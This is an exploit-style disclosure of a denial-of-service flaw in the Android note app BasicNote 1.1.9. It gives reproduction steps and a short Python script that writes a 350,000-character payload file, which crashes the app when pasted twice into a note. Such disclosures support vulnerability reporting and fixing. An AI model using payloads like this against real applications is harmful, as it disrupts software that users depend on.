POC
---

    # Exploit Title: BasicNote 1.1.9 - Denial of Service (PoC)
    # Date: 2021-06-02
    # Author: Brian Rodríguez
    # Download Link: https://play.google.com/store/apps/details?id=notizen.basic.notes.notas.note.notepad&hl=es_MX
    # Version: 1.1.9
    # Category: DoS (Android)

    ##### Vulnerability #####

    BasicNote - Notas, Bloc de notas is vulnerable to a DoS condition when two long lists of characters are being used when creating a note:

    # STEPS #
    # Open the program
    # Create a new Note.
    # Run the python exploit script payload.py, it will create a new payload.txt file
    # Copy the content of the file "payload.txt"
    # Paste the content from payload.txt twice in the new Note.
    # Crashed

    Successful exploitation will causes application stop working.

    I have been able to test this exploit against Android 8.0.

    ##### PoC #####

    #!/usr/bin/env python
    buffer = "\x41" * 350000

    try:
        f = open("payload.txt","w")
        f.write(buffer)
        f.close()
        print ("File created")
    except:
        print ("File cannot be created")